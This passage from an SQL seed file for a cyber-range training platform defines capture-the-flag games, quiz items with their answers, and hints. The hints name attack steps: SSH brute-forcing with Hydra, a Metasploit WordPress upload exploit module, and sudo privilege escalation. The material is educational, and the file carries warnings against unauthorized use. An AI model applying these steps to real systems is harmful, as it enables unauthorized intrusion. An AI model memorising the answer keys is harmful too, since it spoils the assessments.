  Great, you <b>gained access</b> to the server! As a former employee, you know that the system creates regular backups of Big Broker''s clients and store them in the <b>/home/bigbroker/</b> directory. The backup with Pear stocks clients is there (file <b>pear-clients.xml</b>), but when you tried the following command to read it, <b>a permissions error has occurred</b>:
</p>

<pre style="background-color:black;">
  <span class="command">cat /home/bigbroker/pear-clients.xml</span></pre>

<p>
  You are so close and yet so far. :( You need to <b>escalate privileges</b> and get an administrator account! <span style="color: #008000">The server seems to be well updated, but maybe there is a way how to run commands as a server administrator.</span> When you get right permissions, you will be able to see the content of the pear-clients.xml file. <b>The flag is at the beginning of the file.</b>
</p>

<img src="https://is.muni.cz/www/cermmik/metasploit-result.png" style="display: block; margin-left: auto; margin-right: auto; margin-top: 2em; width: 40%;">

<p style="margin-top: 2em">
  <b>If you are stuck and need help, use the following hints:</b>
  <ul>
    <li><b>Hint 1:</b> What''s wrong with the server</li>
    <li><b>Hint 2:</b> Where to find more information</li>
    <li><b>Hint 3:</b> How to exploit the bad configuration</li>
  </ul>
</p>');

INSERT INTO info_level(id, content) VALUES (32, 'Introduction
============
<p>
  You are <b>a long-term employee of Big Broker Inc.</b>, one of the biggest trading companies in the world. After so many years, you are one of the main stock traders. <b>Stock trading is your life!</b> Reliable computer and fast Internet connection are essential premises of your success. Nevertheless, a computer is just a powerful working tool for you. You don''''t know much about the technology and "cyber-security" is a strange word only. <b>However, it will change very quickly...</b>
</p>

<p>
  Your path to understanding the importance of cyber-security has started when your <b>computer broke</b>, and you were not able to sell your stocks in time. Money is the most important thing for you, and now <b>you''''ve lost a lot of them</b> because of the stupid error! <span style="color: #008000">It''''s time to take it into your own hands and fix it!</span>
</p>

<img src="https://is.muni.cz/www/cermmik/CTF-1-intro.jpg" style="display: block; margin-left: auto; margin-right: auto; width: 40%;">

<p style="margin-top: 2em;">
  You have access to the device with the <b>Xubuntu</b> operating system. This is a <b>common Linux distribution</b> enabling all the office activities you need. But it also provides many other interesting tools. <span style="color: #008000">Try to figure out how you can use these tools and fix your problem.</span>
</p>

<p style="margin-bottom: 3em;">
  <b>Press the "Start" button at the bottom of the page to start the game.</b>
</p>


Rules
=====
<p>
  <b>WARNING: You should never use these techniques and skills to gain unauthorized access. That is illegal. The game is for educational purposes only. The main purpose is to show you that absolute security does not exist, but you can learn how to defend yourself.</b>
</p>

<p>
  Click on the <b>Topology</b> button in the blue panel on the top to see the given network topology. When you double-click on the node called Big-Broker, you should see two nodes Database (main company server) and Workstation (common office client).
</p>

<p>
  Now, to gain remote access to your workstation computer click on Workstation and select <b>Remote connection</b>. A new tab appears with remote access to the workstation computer. Use the following credentials to login – <b>username: <span style="color: #008000">bnovak</span></b>, <b>password: <span style="color: #008000">rabbit</span></b>.
</p>

<p>
The game contains four levels. In each level, you will have to complete a specified task. To prove that you mastered the task, and so you are able to continue to the next level, you will have to submit a flag acquired in each task. Every level has a description of what to do and how to get the flag.
</p>

<p>
  General note: <span style="color: #008000">All programs which you will need to complete game tasks are installed (internet connection is not available). </span>
</p>


<h4 class="well well-small">Help System:</h4>

<p style="margin-bottom: 4em;">
  If you are unable to complete a level, you can use a <b>hint</b> which will give a little help, but you will lose some points. After using all the hints, there is <b>help level</b> prepared. It''''s a guided solution which will tell you exactly what to do. The last option is to skip level entirely by clicking on the skip level, but this is not recommended – you won''''t be able to complete the next levels without performing tasks in the current one.
</p>');
INSERT INTO info_level(id, content) VALUES (33, 'Introduction
============
<p>
  The presidential election in Pilsneria is really close. There are some speculations, that one candidate, let''''s call him <b>Frank</b> (his name has been carefully anonymized), evaded paying taxes by buying <b>stocks in Panama through BigBroker Inc.</b> Coincidentally, you are not really a fan of this politician and you think people should learn about his deeds. Therefore, you decided to get some evidence. <span style="color: #008000">Website of BigBroker seems safe, but is it?</span>
</p>

<img src="https://is.muni.cz/www/cermmik/bigbroker-page.png" style="display: block; margin-left: auto; margin-right: auto; width: 40%;">

<p style="margin-top: 2em;">
  Your web browser has a cool functionality called <b>"Developer Tools"</b> that you can use to view and edit source code of a web page. <span style="color: #008000">Try to figure out how you can use these tools to hack it and get the required evidence.</span>
</p>

<p style="margin-top: 3em; margin-bottom: 2em;">
  <i>Note: The game was created within the course <a href="https://www.kypo.cz/en/kypolab" target="_blank">PV177 – KYPOlab: Seminar on Cyber Attack Simulation</a> by Patrik Nemeček and Jan Čech.</i>
</p>


Rules
=====
<p>
  <b>WARNING: You should never use these techniques and skills to gain unauthorized access. This is illegal. This game is only for educational purposes. To show you that absolute security does not exist and also how can you defend yourself.</b>
</p>

<p>
  When you click on Topology button in the blue panel on the top, you should see the given network topology. When you double-click on the node called Internet, you should see one node: Attacker. Attacker represents the attacker''''s computer; it contains all hacking tools you will need.
</p>

<p>
  Now if you want to have an access to attacker computer click on attacker and select <b>Remote connection</b>. New tab appears with access to attacker''''s computer. You can try any program you want. If you will need to <b>login</b>, the default credentials are <b>username: <span style="color: #008000">root</span></b>, <b>password: <span style="color: #008000">toor</span></b>.
</p>

<p>
  The game consists of three levels. In each level, you will have to complete some specified task. To prove that you complete the task and can go to the next level you will have to submit a flag. Every level has a description of what to do and how to get the flag.
</p>

<p>
  General note: <span style="color: #008000">All programs you will need to complete the tasks are installed, and also you don''''t have access to the Internet.</span>
</p>


<h4 class="well well-small">Help System:</h4>

<p>
  If you are unable to complete a level, you can either use <b>hint</b> which will give a little help, but you will lose some points. After using all the hints if you still don''''t know how to complete the task use <b>help level</b>. It''''s a guided solution which will tell you exactly what to do. The last option is to skip level entirely by clicking on the skip level, but this is not recommended - you won''''t be able to complete following levels without doing what is in your current one. It is better to ask someone for help
</p>

<p>
  Each level has a passphrase, so you can go to any level you know passphrase for, but you won''''t get any points for any previous levels. So the good advice is to write down the passphrases as you go through levels.
</p>

<p style="margin-bottom: 4em;">
  <b> DO NOT USE SKIP LEVEL - HIGHER LEVELS CANNOT BE DONE WITHOUT COMPLETING PRECEDING LEVELS </b>
</p>');
INSERT INTO info_level(id, content) VALUES (34, 'Introduction
============
<p style="margin-bottom: 2em">
  You are <b>a former employee of Big Broker Inc.</b> one of the biggest stock trading companies. Recently, although you have been working for them for ten years, you have been fired without giving any reason. But you know the reason very well... It happened because you refused a request of your boss to falsify earnings reports of <b>Pear Inc.</b> stocks. A week ago, you read in the newspapers that <b>Pear Inc. achieved record gains</b>, and thanks to that, the shareholders got a lot of money. You know it''s a big scam, and you have evidence of the manipulation of earnings reports! But what you do not know is <b>who is behind it?</b>
</p>

<p>
  As a former employee, you know that the <b>internal web server</b> of Big Broker Inc. contains <b>information about clients</b> linked to this fraud. However, this server is <b>available only from an internal network</b> that you no longer have access. You also know that your former colleagues do not care too much about the security of their devices. <span style="color: #008000">This issue may be the right way to access the network. But, are you able to exploit it?</span>
</p>

<img src="https://is.muni.cz/www/cermmik/newspapers.jpg" style="display: block; margin-left: auto; margin-right: auto; margin-top: 2em; width: 40%;">

<p style="margin-top: 2em; margin-bottom: 3em;">
  You have an access to the device with <b>Kali Linux</b> operating system. This is an <b>advanced penetration testing</b> Linux distribution used for ethical hacking and network security assessments with a lot of useful tools! <span style="color: #008000">Try to figure out how you can use these tools to hack Big Broker Inc. and get the list of clients.</span>
</p>


Rules
=====
<p>
  <b>WARNING: You should never use these techniques and skills to gain unauthorized access. This is illegal. This game is only for educational purposes. To show you that absolute security does not exist and also how can you defend yourself.</b>
</p>

<p>
  When you click on Topology button in the blue panel on the top, you should see the given network topology. When you double-click on the node called Internet, you should see one node: Attacker. Attacker represents the attacker''s computer; it contains all hacking tools you will need.
</p>

<p>
  Now if you want to have an access to attacker computer click on attacker and select <b>Remote connection</b>. New tab appears with access to attacker''s computer. You can try any program you want. If you will need to <b>login</b>, the default credentials are <b>username: <span style="color: #008000">root</span></b>, <b>password: <span style="color: #008000">toor</span></b>.
</p>

<p>
  The game consists of four levels. In each level, you will have to complete some specified task. To prove that you complete the task and can go to the next level you will have to submit a flag. Every level has a description of what to do and how to get the flag.
</p>

<p>
  General note: <span style="color: #008000">All programs you will need to complete the tasks are installed, and also you don''t have access to the Internet.</span>
</p>


<h4 class="well well-small">Help System:</h4>

<p>
  If you are unable to complete a level, you can either use <b>hint</b> which will give a little help, but you will lose some points. After using all the hints if you still don''t know how to complete the task use <b>help level</b>. It''s a guided solution which will tell you exactly what to do. The last option is to skip level entirely by clicking on the skip level, but this is not recommended – you won''t be able to complete following levels without doing what is in your current one. It is better to ask someone for help
</p>

<p>
  Each level has a passphrase, so you can go to any level you know passphrase for, but you won''t get any points for any previous levels. So the good advice is to write down the passphrases as you go through levels.
</p>

<p style="margin-bottom: 4em;">
  <b> DO NOT USE SKIP LEVEL – HIGHER LEVELS CANNOT BE DONE WITHOUT COMPLETING PRECEDING LEVELS. </b>
</p>');


INSERT INTO assessment_level(id, assessment_type, instructions, questions) VALUES (7, 'TEST', 'Fill me up', '[{"question_type":"FFQ","text":"Which tool would you use to scan the open ports of a server?","points":6,"penalty":3,"order":0,"answer_required":true,"correct_choices":["nmap","Nmap"]},{"question_type":"MCQ","text":"Among the following choices, select all the possible methods of prevention against an unwanted file upload.","points":4,"penalty":2,"order":1,"answer_required":true,"choices":[{"order":0,"text":"whitelisting file extensions","is_correct":true},{"order":1,"text":"limiting maximum file size","is_correct":true},{"order":2,"text":"using database triggers","is_correct":false},{"order":3,"text":"saving data to an NTFS volume","is_correct":false}]},{"question_type":"EMI","text":"Connect the following exemplary situations with the corresponding type of password attack.","points":3,"penalty":1,"order":2,"answer_required":true,"choices":[{"order":0,"text":"trying all possible alphanumeric combinations of 8 characters","pair":6},{"order":1,"text":"trying common words of English language","pair":4},{"order":2,"text":"looking up the value of a hashed password","pair":7},{"order":3,"text":"tricking a user into giving away his password by posing as a service administrator","pair":5},{"order":4,"text":"dictionary attack","pair":1},{"order":5,"text":"social engineering","pair":3},{"order":6,"text":"brute force attack","pair":0},{"order":7,"text":"rainbow table attack","pair":2}]}]');
INSERT INTO assessment_level(id, assessment_type, instructions, questions) VALUES (8, 'QUESTIONNAIRE', 'No rush', '[{"question_type":"FFQ","text":"Which tool would you use to scan the open ports of a server?","points":6,"penalty":3,"order":0,"answer_required":true,"correct_choices":["nmap","Nmap"]},{"question_type":"MCQ","text":"Among the following choices, select all the possible methods of prevention against an unwanted file upload.","points":4,"penalty":2,"order":1,"answer_required":true,"choices":[{"order":0,"text":"whitelisting file extensions","is_correct":true},{"order":1,"text":"limiting maximum file size","is_correct":true},{"order":2,"text":"using database triggers","is_correct":false},{"order":3,"text":"saving data to an NTFS volume","is_correct":false}]},{"question_type":"EMI","text":"Connect the following exemplary situations with the corresponding type of password attack.","points":3,"penalty":1,"order":2,"answer_required":true,"choices":[{"order":0,"text":"trying all possible alphanumeric combinations of 8 characters","pair":6},{"order":1,"text":"trying common words of English language","pair":4},{"order":2,"text":"looking up the value of a hashed password","pair":7},{"order":3,"text":"tricking a user into giving away his password by posing as a service administrator","pair":5},{"order":4,"text":"dictionary attack","pair":1},{"order":5,"text":"social engineering","pair":3},{"order":6,"text":"brute force attack","pair":0},{"order":7,"text":"rainbow table attack","pair":2}]}]');
INSERT INTO assessment_level(id, assessment_type, instructions, questions) VALUES (9, 'TEST', 'Fill me up', '[{"question_type":"FFQ","text":"Which tool would you use to scan the open ports of a server?","points":6,"penalty":3,"order":0,"answer_required":true,"correct_choices":["nmap","Nmap"]},{"question_type":"MCQ","text":"Among the following choices, select all the possible methods of prevention against an unwanted file upload.","points":4,"penalty":2,"order":1,"answer_required":true,"choices":[{"order":0,"text":"whitelisting file extensions","is_correct":true},{"order":1,"text":"limiting maximum file size","is_correct":true},{"order":2,"text":"using database triggers","is_correct":false},{"order":3,"text":"saving data to an NTFS volume","is_correct":false}]},{"question_type":"EMI","text":"Connect the following exemplary situations with the corresponding type of password attack.","points":3,"penalty":1,"order":2,"answer_required":true,"choices":[{"order":0,"text":"trying all possible alphanumeric combinations of 8 characters","pair":6},{"order":1,"text":"trying common words of English language","pair":4},{"order":2,"text":"looking up the value of a hashed password","pair":7},{"order":3,"text":"tricking a user into giving away his password by posing as a service administrator","pair":5},{"order":4,"text":"dictionary attack","pair":1},{"order":5,"text":"social engineering","pair":3},{"order":6,"text":"brute force attack","pair":0},{"order":7,"text":"rainbow table attack","pair":2}]}]');

INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Very good advice', 'Hint1', 10, 1);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Very bad advice', 'Hint2', 6, 2);

INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Right-click on any TELNET packet and select option <span style="color: #008000"><b>"Follow → TCP stream"</b></span>.', 'Hint1', 10, 11);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use the following command: <span style="color: #008000"><b>$ ssh bnovak@database.bigbroker.ex</b></span>.', 'Hint1', 10, 13);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'The same case as yours... His username is a combination of the first letter of the name and surname: <span style="color: #008000"><b>vondrus</b></span>.', 'Hint1', 15, 15);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use default settings of the THC-Hydra and <span style="color: #008000"><b>do not use "-t" option</b></span>.', 'Hint2', 5, 15);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Your <b>private SSH key</b> must be securely stored so that no one has access to it. Therefore the keys need to be <span style="color: #008000"><b>generated on your workstation</b></span>.', 'Hint1', 10, 17);

INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Create a new account using the "Register" page.', 'Hint1', 1, 19);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Just look into the /root/ directory.', 'Hint2', 1, 19);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Look at what .htaccess file is: <a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank">https://httpd.apache.org/docs/current/howto/htaccess.html</a>.', 'Hint1', 1, 21);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Try to upload other file and check how form for delete looks in "Developer tools".', 'Hint2', 1, 21);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Replace path of the file that is being deleted in delete form using "Developer tools".', 'Hint3', 2, 21);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Martin Sramek', 'Hint1', 2, 23);

INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use <b style="color: #008000">nmap</b> tool to detect open services.', 'Hint1', 5, 25);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'You can use <b style="color: #008000">hydra</b> or <b style="color: #008000">ncrack</b> tool.', 'Hint2', 10, 25);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Come on, that was easy! Just look to your desktop directory <b style="color: #008000">/root/Desktop/Tools/</b>.', 'Hint3', 3, 25);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Copy required <b>Tools</b> packages (<b>/root/Desktop/Tools/</b>) from the Kali linux to the workstation using <span style="color: #008000"><b>scp</b></span> command.', 'Hint1', 7, 27);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'WordPress <b>plugins</b> vulnerability scanner <span style="color: #008000"><b>wpscan</b></span>. For more information, see the <a href="https://wpscan.org/" target="_blank"><b>project page</b></a>.', 'Hint2', 8, 27);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), '<span style="color: #008000"><b>Metasploit</b></span>, this is a really classic tool.', 'Hint1', 8, 29);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use the <span style="color: #008000"><b>exploit/unix/webapp/wp_wpshop_ecommerce_file_upload</b></span> plugin.', 'Hint2', 10, 29);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'The administrator allowed to run some of the installed tools using the sudo command. Use <span style="color: #008000"><b>sudo -l</b></span> to see these tools.', 'Hint1', 10, 31);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Use <a href="https://google.com" target="_blank">Google</a>! There are definitely some interesting guides on the net.', 'Hint2', 5, 31);
INSERT INTO hint(id, content, title, hint_penalty, game_level_id) VALUES (nextval('hint_id_seq'), 'Check this guide with a lot of great ideas: <a href="https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md" target="_blank">https://github.com/cermmik/security/blob/master/privilege_escalation_-_linux.md</a>.', 'Hint3', 13, 31);

INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar, beta_testing_group_id) VALUES (nextval('training_definition_id_seq'), 'Released training definition', null, null, 'RELEASED', 'TrainingDefinition1', 1, 4, true, 1);
INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar, beta_testing_group_id) VALUES (nextval('training_definition_id_seq'), 'Unreleased training definition', null, null, 'UNRELEASED', 'TrainingDefinition2', 2, 5, false, 2);
INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar, beta_testing_group_id) VALUES (nextval('training_definition_id_seq'), 'Released training definition2', null, null, 'RELEASED', 'TrainingDefinition2', 3, 6, true, 3);
INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar, beta_testing_group_id) VALUES (nextval('training_definition_id_seq'), 'Training definition - securing connection', null, null, 'RELEASED', 'CTF-1: No Secure Connection', 1, 32, true, 4);
INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar, beta_testing_group_id) VALUES (nextval('training_definition_id_seq'), 'Training definition - rigging the election', null, null, 'RELEASED', 'CTF-2: Rigging the Election', null, 33, true,5);
INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar, beta_testing_group_id) VALUES (nextval('training_definition_id_seq'), 'Training definition - biggest stock scam', null, null, 'RELEASED', 'CTF-3: The Biggest Stock Scam Of All Time', null, 34, true, 6);
INSERT INTO training_definition(id, description, outcomes, prerequisities, state, title, sandbox_definition_ref_id, starting_level, show_stepper_bar, beta_testing_group_id) VALUES (nextval('training_definition_id_seq'), 'Definition with test assessments', null, null, 'RELEASED', 'TrainingDefinition1', null, 9, true, 7);

INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 5, 1, 1, '2016-10-19 10:23:54+02', '2017-10-19 10:23:54+02', 'pass-1235', 'Concluded Instance');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 2, null, 1, '2016-10-19 10:23:54+02', '2022-10-19 10:23:54+02', 'hello-6578', 'Current Instance');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 25, 3, 1, '2020-10-19 10:23:54+02', '2024-10-19 10:23:54+02', 'keyword-9999', 'Future Instance');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 25, 4, 3, '2017-10-19 10:23:54+02', '2024-10-19 10:23:54+02', 'keyword-1111', 'Future Instance');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 1, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0000', 'Test Instance KYPO');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 1, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0001', 'Test Instance KYPO');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 2, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0002', 'Test Instance KYPO');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 2, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0003', 'Test Instance KYPO');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 3, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0004', 'Test Instance KYPO');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 3, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0005', 'Test Instance KYPO');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 4, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0006', 'Test Instance KYPO');
INSERT INTO training_instance(id, pool_size, pool_id, training_definition_id, start_time, end_time, access_token, title) VALUES (nextval('training_instance_id_seq'), 4, null, 4, '2019-02-01 10:00:00+02', '2019-03-30 10:00:00+02', 'keyword-0007', 'Test Instance KYPO');

INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'pass-1235');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'hello-6578');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-9999');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0000');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0001');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0002');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0003');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0004');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0005');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0006');
INSERT INTO access_token(id, access_token) VALUES (nextval('access_token_id_seq'), 'keyword-0007');

INSERT INTO sandbox_instance_ref(id, sandbox_instance_ref, training_instance_id) VALUES (nextval('sandbox_instance_ref_id_seq'), 1, 1);
INSERT INTO sandbox_instance_ref(id, sandbox_instance_ref, training_instance_id) VALUES (nextval('sandbox_instance_ref_id_seq'), 2, 1);
INSERT INTO sandbox_instance_ref(id, sandbox_instance_ref, training_instance_id) VALUES (nextval('sandbox_instance_ref_id_seq'), 3, 3);
INSERT INTO sandbox_instance_ref(id, sandbox_instance_ref, training_instance_id) VALUES (nextval('sandbox_instance_ref_id_seq'), 4, 3);
INSERT INTO sandbox_instance_ref(id, sandbox_instance_ref, training_instance_id) VALUES (nextval('sandbox_instance_ref_id_seq'), 5, 4);
INSERT INTO sandbox_instance_ref(id, sandbox_instance_ref, training_instance_id) VALUES (nextval('sandbox_instance_ref_id_seq'), 6, 4);

INSERT INTO user_ref(id, user_ref_login, user_ref_full_name) VALUES (nextval('user_ref_id_seq'),'Organizer1', 'Mgr. Ing. Pavel Šeda');
INSERT INTO user_ref(id, user_ref_login, user_ref_full_name) VALUES (nextval('user_ref_id_seq'),'Organizer2', 'RNDr. Čermák');
INSERT INTO user_ref(id, user_ref_login, user_ref_full_name) VALUES (nextval('user_ref_id_seq'),'Participant1', 'Bc. Martin Hamerník');
INSERT INTO user_ref(id, user_ref_login, user_ref_full_name) VALUES (nextval('user_ref_id_seq'),'Participant2', 'Bc. Boris Jaduš');
INSERT INTO user_ref(id, user_ref_login, user_ref_full_name) VALUES (nextval('user_ref_id_seq'), 'Designer1', 'Bc. Dominik Pilár');
INSERT INTO user_ref(id, user_ref_login, user_ref_full_name) VALUES (nextval('user_ref_id_seq'), 'Designer2', 'Mgr. Ing. Jakub Čegan');
INSERT INTO user_ref(id, user_ref_login, user_ref_full_name) VALUES (nextval('user_ref_id_seq'), 'Designer3', 'Mgr. Ing. Pavel Šeda');

INSERT INTO training_instance_user_ref(training_instance_id, user_ref_id) VALUES (1, 1);
INSERT INTO training_instance_user_ref(training_instance_id, user_ref_id) VALUES (2, 1);
INSERT INTO training_instance_user_ref(training_instance_id, user_ref_id) VALUES (3, 2);
INSERT INTO training_definition_user_ref(training_definition_id, user_ref_id) VALUES (1, 5);
INSERT INTO training_definition_user_ref(training_definition_id, user_ref_id) VALUES (2, 6);
INSERT INTO training_definition_user_ref(training_definition_id, user_ref_id) VALUES (3, 7);


INSERT INTO training_run(id, start_time, end_time, state, current_level_id, sandbox_instance_ref_id, training_instance_id, user_ref_id, solution_taken, event_log_reference, incorrect_flag_count, assessment_responses, total_score, current_score, level_answered) VALUES (nextval('training_run_id_seq'),'2016-10-19 10:23:54+02', '2022-10-19 10:23:54+02', 'ALLOCATED', 4, 1, 1, 3, false, null, 0, '[]',30, 20, false);
INSERT INTO training_run(id, start_time, end_time, state, current_level_id, sandbox_instance_ref_id, training_instance_id, user_ref_id, solution_taken, event_log_reference, incorrect_flag_count, assessment_responses, total_score, current_score, level_answered) VALUES (nextval('training_run_id_seq'),'2020-10-19 10:23:54+02', '2024-10-19 10:23:54+02', 'ALLOCATED', 4, 3, 3, 4, false, null, 0, '[]', 100, 10, false);
INSERT INTO training_run(id, start_time, end_time, state, current_level_id, sandbox_instance_ref_id, training_instance_id, user_ref_id, solution_taken, event_log_reference, incorrect_flag_count, assessment_responses, total_score, current_score, level_answered) VALUES (nextval('training_run_id_seq'),'2019-10-19 10:23:54+02', '2024-10-19 10:23:54+02', 'ALLOCATED', 6, 5, 4, 3, false, null, 0, '[]', 0, 0, true);
INSERT INTO training_run(id, start_time, end_time, state, current_level_id, sandbox_instance_ref_id, training_instance_id, user_ref_id, solution_taken, event_log_reference, incorrect_flag_count, assessment_responses, total_score, current_score, level_answered) VALUES (nextval('training_run_id_seq'),'2019-10-19 10:23:54+02', '2024-10-19 10:23:54+02', 'ALLOCATED', 1, 4, 3, 4, false, null, 0, '[]', 60, 10, true);
